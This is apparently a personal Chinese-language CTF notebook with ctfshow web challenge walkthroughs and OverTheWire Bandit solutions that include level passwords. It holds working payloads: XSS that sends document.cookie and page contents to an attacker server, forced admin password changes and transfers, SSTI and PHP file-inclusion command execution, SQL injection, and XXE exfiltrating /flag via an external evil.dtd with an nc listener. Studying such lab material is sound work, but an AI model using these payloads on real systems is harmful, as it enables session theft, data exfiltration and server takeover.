    <!--最好就是用一些不需要点击等任何条件就能触发的js事件-->
```

##### Ctfshow-web320

**反射型**

测试发现过滤了尖括号和空格。过滤空格用**`/`**代替。通杀**反射型**Ctfshow-web321-326，因为这里面几天刚好都没过滤svg

```js
<body/onload=window.location.href='http://91.149.203.137/files/getCookie.php?c='+document.cookie>
```

##### Ctfshow-web327

**存储型**
发件人随便填写，**收件人填写admin**，新的内容写入如下内容。

```js
<script>window.location.href='http://91.149.203.137/files/getCookie.php?c='+document.cookie</script>
```

##### Ctfshow-web328

**存储型**
后台管理员有功能页面能查看注册用户的账号密码，账号密码改为JS代码，管理员会不会点击触发JS呢？

```js
<script>window.location.href='http://91.149.203.137/files/getCookie.php?c='+document.cookie</script>
```

服务器端接收到了管理员的Cookie，然后用管理员cookie登录后台。
注意，这里要用burp抓包来修改cookie，登陆的时候需要一次Cookie，返回后台账号密码数据的时候还要一次Cookie，且Cookie一直在变，随时查看新的Cookie并修改发包，否则会出现登录admin但是看不见账号密码的情况。登陆成功且看到账号密码后得到flag。

##### Ctfshow-web329

**存储型**
获取到Cookie的Session后还没来得及改包使用就会刷新新的Cookie。需要一种点击后就能立刻用Cookie登录到页面的payload

```js
<script>
    $('div.layui-table-cell.laytable-cell-1-0-1').each(function(index,value){
    	if(value.innerHTML.indexOf('ctfshow{')>-1){
            window.location.href='http://sxylao1.asia:9023/'+value.innerHTML;
        }
	});
</script>
<!--用js代码读取网页会出现ctfshow{}flag位置的js字段名 F12审查元素中得到.laytable-cell-1-0-1 读取其中与ctfshow有关字段发送到xss平台-->
```

> $('div.layui-table-cell.laytable-cell-1-0-1').each(function(index, value) { ... });
> 这是一个 jQuery 选择器，它查找具有类名 'layui-table-cell'、'laytable-cell-1-0-1' 的 <div> 元素集合，并对每个元素执行一个函数。
>
> .each(function(index, value) { ... })
> 这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，index 表示当前元素在集合中的索引，value 表示当前元素的引用。
>
> if (value.innerHTML.indexOf('ctfshow{') > -1) { ... }
> 这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 'ctfshow{'。value.innerHTML 表示当前元素的 HTML 内容，.indexOf('ctfshow{') 用于查找是否包含 'ctfshow{'，如果包含则返回大于 -1 的索引，否则返回 -1。
>
> window.location.href = 'http://sxylao1.asia:9023/' + value.innerHTML;
> 如果条件满足，即当前元素的内容包含 'ctfshow{'，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 'http://sxylao1.asia:9023/' 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 'ctfshow{' 以及其他内容。

```sh
nc -lvvp 9023 #vps监听
```

监听到了用户名但是没有监听到flag，所以需要修改payload 使payload做条件判断时包含**`ctfshow{`** 但是不包含**`script`**
https://blog.csdn.net/Jayjay___/article/details/133375048 有点难 参考该篇博客

```js
<script>
    $('div.layui-table-cell.laytable-cell-1-0-1').each(function (index, value) {
    	if ((value.innerHTML.indexOf('ctfshow{') > -1)&&(value.innerHTML.indexOf('script') === -1)) {
            window.location.href = 'http://sxylao1.asia:9023/' +value.innerHTML;
        }
	});
</script>
```

注册一个hacker账户，密码就写上如上的js攻击代码。再登录即可，返回服务器查看接收到的flag 

##### Ctfshow-web330

**存储型** 

有后台管理员页面，抓包发现在登录状态下进入了修改密码页面不需要验证，如果管理员不经意间点击链接来到了已经传参的修改密码界面，管理员密码会被直接修改。

```js
<script>window.location.href='http://127.0.0.1/api/change.php?p=HACKED';</script>
```

不知道账号密码那个是触发XSS的可以注册时全部都写payload，等待一会，用admin:HACKED登录到后台管理页面获取flag，上面的payload登陆后咱自己也会跳到XSS链接(**127.0.0.1**)里面。**可以用以下代码悄悄触发XSS攻击**

```js
<script src='http://127.0.0.1/api/change.php?p=HACKED'></script>
```

##### Ctfshow-web331

**存储型** 

同330情景，但是修改密码的传参在POST里面。

```js
<script>$.ajax({url:'http://127.0.0.1/api/change.php',type:'post',data:{p:'HACKED'}});</script>
```

##### Ctfshow-web332

注册登录转账，转账时抓包，得到`POST /api/amount.php HTTP/1.1` `u=admin&a=50`
还是api，`/api/amount.php`。参数都是POST传递的，账号是`u`，款是`a`。

```js
$.ajax({
    url: "http://127.0.0.1/api/amount.php",
    method: "POST",
    data: {'u': 'HACKER', 'a': 99999}, <!--管理员点击后给HACKER转账99999-->
    cache: false,
    success: function (res) {
    }
})
```

```js
<script src=http://sxylao1.asia/files/ctfshowXSS.js></script>
```

还有一个逻辑漏洞，直接用自己账户给admin转账-99999，负负得正，就会给自己账户上增加99999，直接购买flag。

##### Ctfshow-web333

同332，ban掉了逻辑漏洞的负数转账，但是自己给自己转账不会扣除自己的账户余额，可以不停的给自己转账增加余额，可以手操也可以写脚本。

```python
import requests
url = "http://c7e62c4c-a965-48a5-9c7a-390114141304.challenge.ctf.show/api/amount.php"
headers ={'Cookie':'PHPSESSID=gcvvvfpmp9c8dnfrd34b2ts93r'} #自己账号登陆后的sessionid

for i in range(0,10000):
    tmp=i*4
    data = {
        'u': 'HACKER',
        'a': str(tmp)
    }
    res=requests.post(url,data=data,headers=headers)
```

#### Java

##### web279

#### SSTI

##### web361

```python
?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
```

#### XXE

##### web373

```php
<?php
error_reporting(0); //关闭了PHP的错误报告
libxml_disable_entity_loader(false); //该函数禁用或启用libxml库中的外部实体加载器，flase代表启用外部实体，是XEE的前提
$xmlfile = file_get_contents('php://input'); //从请求的正文中读取XML数据，php://input是可以访问请求的原始数据的只读流
if(isset($xmlfile)){ //检查是否成功从输入流中读取到了XML数据
    $dom = new DOMDocument(); //创建一个新的DOMDocument对象，用于处理XML数据。
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    //加载XML数据到DOM对象，LIBXML_NOENT使得处理过程中会替换XML实体，LIBXML_DTDLOAD允许加载文档类型定义（DTD）。
    $creds = simplexml_import_dom($dom);
    //将DOM对象转换为SimpleXML对象，这样可以更方便地访问XML数据中的内容。
    $ctfshow = $creds->ctfshow;
    //从转换得到的XML对象中提取ctfshow元素的值。
    echo $ctfshow; //将ctfshow元素的内容输出到响应中。
}
highlight_file(__FILE__); //高亮显示当前执行的文件内容，通常用于调试。
```

Payload，只能BP抓包发送，Hackbar发POST如果不是键值对形式，POST数据不会发送。

```xml
<!DOCTYPE test [ 
<!ENTITY xxe SYSTEM "file:///flag">
]>
<sxylao1>
<ctfshow>&xxe;</ctfshow>
</sxylao1>
```

> 1. `<!DOCTYPE test [`
>    - 定义了一个名为`test`的DOCTYPE。
> 2. `<!ENTITY xxe SYSTEM "file:///flag">`
>    - 定义了一个名为`xxe`的XML实体，它通过`SYSTEM`关键字从系统的`/flag`路径加载内容。
> 3. `]`
>    - 结束DOCTYPE声明。
> 4. `<sxylao1>`
>    - 定义了根元素`sxylao1`。
> 5. `<ctfshow>&xxe;</ctfshow>`
>    - `ctfshow`元素中包含了对之前定义的`xxe`实体的引用。这导致在处理XML时，会从`/flag`文件中加载数据，并将其值插入到`ctfshow`元素中。
> 6. `</sxylao1>`
>    - 结束根元素。

##### web374

服务器上放evil.dtd，内部的%号要进行实体编码成%

```xml
<!ENTITY % all "<!ENTITY &#x25; send  SYSTEM 'http://124.222.136.33:4444/%file;'> ">
%all;
%send;
```

服务器开始监听外代`nc -lvnp 4444`

payload：

```xml
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % dtd SYSTEM "http://sxylao1.asia/files/evil.dtd">
%dtd;
]>
<sxylao1>
HACKED
</sxylao1>
```



### Web



#### web签到题

查看源码并base64解码

#### web2

万能密码发现回显

```
1' or 1=1 union select 1,2,3;#
1' or 1=1 union select 1,database(),3;#
1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='web2'),3;#
1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag'),3;#
1' union select 1,(select flag from flag),3;#
```

#### web3

文件包含漏洞，include()函数包含的文件会被执行，使用PHP伪协议配合抓包工具进行命令执行，从而获取flag
php://input 可以访问请求的原始数据，配合文件包含漏洞可以将post请求体中的内容当做文件内容执行，enctype=multipart/form-data"时，php:/input将会无效

```sql
?url=php://input        -- GET请求的url中拼接伪协议
<?php system('ls')?>    -- post请求内容构造需要执行的代码
```

```
GET /?url=php://input HTTP/1.1
Host: c1fb0722-bdec-4707-9e3a-78eaba9daf7d.challenge.ctf.show
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?php system('ls')?>
```

```sql
ctf_go_go_go index.php #得到返回信息
```

```sql
http://c1fb0722-bdec-4707-9e3a-78eaba9daf7d.challenge.ctf.show/?url=ctf_go_go_go #拿下flag
```



### 愚人杯

#### easy_signin

```python
http://a3aee8d9-0a85-4dc6-9fe4-d36d3cd7469c.challenge.ctf.show/?img=ZmFjZS5wbmc= #ZmFjZS5wbmc=经过base64解码face.png
```

将`index.php`base64加密后传给`img=`，`http://a3aee8d9-0a85-4dc6-9fe4-d36d3cd7469c.challenge.ctf.show/?img=aW5kZXgucGhw`
查看源代码并将得到的数据base64解码得到flag。

#### easy_ssti

查看注释发现`app.zip`，url/app.zip下载，解压得到app.py

```python
from flask import Flask
from flask import render_template_string,render_template
app = Flask(__name__)

@app.route('/hello/')
def hello(name=None):
    return render_template('hello.html',name=name)
@app.route('/hello/<name>')
def hellodear(name):
    if "ge" in name:
        return render_template_string('hello %s' % name)
    elif "f" not in name:
        return render_template_string('hello %s' % name)
    else:
        return 'Nonononon'
```

```
/hello/{{ "".__class__.__base__ .__subclasses__()[132].__init__.__globals__['popen'](request.args.get("ctfshow")).read()}}ge?ctfshow=cat /flag 
```

#### 被遗忘的反序列化

好难，以后水平差不多了再看

#### 暗网聊天室

```python
import re
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from flask import Flask, request, abort

url = 'http://xxx.challenge.ctf.show/' # 题目URL，先等几秒再运行

# 加密
def encrypt(plaintext, public_key):
    cipher = PKCS1_v1_5.new(RSA.importKey(public_key))

    ciphertext = ''
    for i in range(0, len(plaintext), 128):
        ciphertext += cipher.encrypt(plaintext[i:i+128].encode('utf-8')).hex()

    return ciphertext

def get_plaintext_half():
    text = requests.get(url+'/update').text
    return re.findall('[^@]*\.92', text)[0]

def get_public_key(public_key):
    text = requests.get(url+'/shop?api=127.0.0.1:9999').text
    return re.findall('-----BEGIN PUBLIC KEY-----\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n-----END PUBLIC KEY-----', text)[public_key-1]

IP = '2.56.12.89'
plaintext_half = get_plaintext_half() # 获取解密后的数据

# 获取公钥2、3
public_key2 = get_public_key(2).replace('\n','').replace('-----BEGIN PUBLIC KEY-----','-----BEGIN PUBLIC KEY-----\n').replace('-----END PUBLIC KEY-----','\n-----END PUBLIC KEY-----')
public_key3 = get_public_key(3).replace('\n','').replace('-----BEGIN PUBLIC KEY-----','-----BEGIN PUBLIC KEY-----\n').replace('-----END PUBLIC KEY-----','\n-----END PUBLIC KEY-----')

# 两次加密
IP_ciphertext = encrypt(IP, public_key3)
IP_ciphertext = encrypt(IP_ciphertext, public_key2)

# 替换最终IP
plaintext_half_new = plaintext_half[:2048] + IP_ciphertext + plaintext_half[4096:]

# 请求
requests.post(url + '/pass_message',data = {'message':plaintext_half_new})
# 接收明文
text = requests.get(url+'/update').text
flag = re.findall('ctfshow{.*}', text)[0]
print(flag)
input()
```

## OverTheWire

https://overthewire.org/wargames/bandit/bandit1.html

### Level 0

The goal of this level is for you to log into the game using SSH. The host to which you need to connect is **bandit.labs.overthewire.org**, on port 2220. The username is **bandit0** and the password is **bandit0**. Once logged in, go to the [Level 1](https://overthewire.org/wargames/bandit/bandit1.html) page to find out how to beat Level 1.

登录账号bandit0

```sh
ssh bandit0@bandit.labs.overthewire.org:2220 #密码bandit0
ssh bandit0@bandit.labs.overthewire.org -p 2220
```

### Level 0 → Level 1

The password for the next level is stored in a file called **readme** located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.

```sh
ls
cat readme #NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
#登录账号bandit1
ssh bandit1@bandit.labs.overthewire.org -p 2220 #密码NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
```

### Level 1 → Level 2

The password for the next level is stored in a file called **-** located in the home directory

```sh
ls
cat - #rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
#登录账号bandit2
ssh bandit2@bandit.labs.overthewire.org -p 2220 #密码rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
```

### Level 2 → Level 3

The password for the next level is stored in a file called **spaces in this filename** located in the home directory

```sh
ls #spaces in this filename
cat spaces\ in\ this\ filename #aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
#登录账号bandit3
ssh bandit3@bandit.labs.overthewire.org -p 2220 #密码aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
```

### Level 3 → Level 4

The password for the next level is stored in a hidden file in the **inhere** directory.

```sh
ls #inhere
cd inhere
ls -al #.hidden
cat .hidden #2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
#登录账号bandit4
ssh bandit4@bandit.labs.overthewire.org -p 2220 #密码2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
```

### Level 4 → Level 5

The password for the next level is stored in the only human-readable file in the **inhere** directory. Tip: if your terminal is messed up, try the “reset” command.

```sh
cd inhere
ls -al #-file00 ~ -file09
for n in {0..9}; do file ./file0$n; done #用file命令查询文件属性 发现除了-file07为ASCII text文件 其他都是data文件
tail ./* #lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
cat < -file07 #lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
#登录账号bandit5
ssh bandit5@bandit.labs.overthewire.org -p 2220 #密码lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
```

### Level 5 → Level 6

The password for the next level is stored in a file somewhere under the **inhere** directory and has all of the following properties:

> - ehuman-readable
> - 1033 bytes in size
> - not executable

```sh
cd inhere
find -size 1033c #./maybehere07/.file2
cat ./maybehere07/.file2 #P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
ssh bandit6@bandit.labs.overthewire.org -p 2220 #密码P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
```

### Level 6 → Level 7

The password for the next level is stored **somewhere on the server** and has all of the following properties:

- owned by user bandit7
- owned by group bandit6
- 33 bytes in size

```sh
find / -group bandit6 -user bandit7 -size 33c #/var/lib/dpkg/info/bandit7.password
cat /var/lib/dpkg/info/bandit7.password #z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
ssh bandit7@bandit.labs.overthewire.org -p 2220 #密码z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
```

### Level 7 → Level 8

The password for the next level is stored in the file **data.txt** next to the word **millionth**

```sh
ls #data.txt
cat data.txt | grep millionth
#millionth       TESKZC0XvTetK0S9xNwm25STk5iWrBvP
ssh bandit8@bandit.labs.overthewire.org -p 2220 #密码TESKZC0XvTetK0S9xNwm25STk5iWrBvP
```

### Level 8 → Level 9

The password for the next level is stored in the file **data.txt** and is the only line of text that occurs only once

```sh
#sort 命令用于将文本文件内容加以排序，-u 意味着是唯一的(unique)，输出的结果是去完重了的
ls #data.txt
sort data.txt | uniq -u #EN632PlfYiZbn3PhVK3XOGSlNInNE00t
ssh bandit9@bandit.labs.overthewire.org -p 2220 #密码EN632PlfYiZbn3PhVK3XOGSlNInNE00t
```

### Level 9 → Level 10

The password for the next level is stored in the file **data.txt** in one of the few human-readable strings, preceded by several ‘=’ characters.

```sh
#strings命令主要用来提取和显示非文本文件中的文本字符串
ls #data.txt
cat data.txt | strings | grep "===" #G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
ssh bandit10@bandit.labs.overthewire.org -p 2220 #密码G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
```

### Level 10 → Level 11

The password for the next level is stored in the file **data.txt**, which contains base64 encoded data

```sh
cat data.txt | base64 -d #6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
ssh bandit11@bandit.labs.overthewire.org -p 2220 #密码6zPeziLdR2RKNdaNYFNb6nVCKzphlXHBM
```

### Level 11 → Level 12
